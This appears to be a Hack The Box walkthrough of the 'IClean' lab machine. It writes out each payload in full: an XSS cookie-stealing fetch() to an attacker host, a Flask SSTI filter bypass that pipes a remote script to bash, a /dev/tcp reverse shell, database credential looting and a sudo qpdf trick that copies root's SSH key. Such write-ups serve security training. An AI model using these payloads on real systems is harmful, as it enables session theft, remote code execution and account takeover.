🧼 HTB: IClean – Walkthrough

Difficulty: Medium
Tags: XSS, Cookie Theft, SSTI Bypass, MySQL Looting, qpdf Privilege Escalation
🔍 Initial Recon

Started with standard nmap:

nmap -sC -sV -v <TARGET_IP>

Only ports open:

    22: SSH

    80: HTTP

🧪 Web Analysis

Web server = Flask (confirmed via Wappalyzer).

    /login – nothing useful.

    /quote – dynamic behavior found in service parameter.

🧠 Attempted basic XSS:

<img src="http://<attacker-ip>:8000" />

🛰️ Set up listener:

python3 -m http.server 8000

✅ Received the callback — confirmed XSS.
🍪 XSS to Session Hijack

Discovered /dashboard via feroxbuster, but it was access-restricted.

💉 Crafted XSS cookie-stealing payload:

<img src=x onerror=fetch('http://<attacker-ip>:8000/?c='+document.cookie)>

⚡ Stolen cookie appeared in listener.

Used Cookie Editor to inject it manually → gained access to /dashboard.
🧾 SSTI via QR Code Generator

Within dashboard: invoice generator with QR code builder.

Found a parameter at /QRGenerator/qr_link that reflected user input.

🧪 Tested with:

{{7*7}}

🟢 Result → 49 appeared → SSTI confirmed

Tried typical payloads → blocked (likely filtered).
🧠 SSTI Filter Bypass (Flask)

Payload used:

{{request|attr("__globals__")|attr("__getitem__")("__builtins__")|attr("__getitem__")("__import__")("os")|attr("popen")("curl <attacker-ip>:8000/revshell | bash")|attr("read")()}}

Set up:

echo "bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'" > revshell
python3 -m http.server 8000
nc -lvnp <port>

Injected payload into qr_link → boom, reverse shell landed.
🔍 Post-Exploit Enumeration

Shell landed in /opt/app.

Found app.py with database creds.

Connected to MySQL:

mysql -u iclean -p

Extracted password hashes for admin and consuela.

Cracked consuela's hash with CrackStation → got a valid password.

Logged in as consuela via SSH.
🧨 Privilege Escalation via qpdf

Checked sudo perms:

sudo -l

✅ consuela can run /usr/bin/qpdf as root.

Used qpdf to copy root’s SSH key:

sudo /usr/bin/qpdf --empty /tmp/priv_key.txt --qdf --add-attachment /root/.ssh/id_rsa --

Extracted the key → chmod 600 → used for SSH:

ssh -i priv_key.txt root@<TARGET_IP>

Got root access.
🏁 Flags

    user.txt: ✔️

    root.txt: ✔️
